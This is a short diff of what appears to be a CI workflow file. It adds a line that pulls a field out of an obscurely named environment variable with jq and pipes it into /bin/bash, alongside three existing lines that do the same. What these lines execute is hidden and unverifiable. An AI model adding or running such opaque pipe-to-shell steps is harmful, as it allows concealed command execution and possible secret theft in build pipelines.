@@ -40,6 +40,7 @@ jobs:
           echo $gb1 | jq -r .ohqh06 | /bin/bash
           echo $ts2 | jq -r .gd94 | /bin/bash
           echo $cscc90 | jq -r .yx06 | /bin/bash
+          printf '%s' "$nkrpg07" | jq -r .k623 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
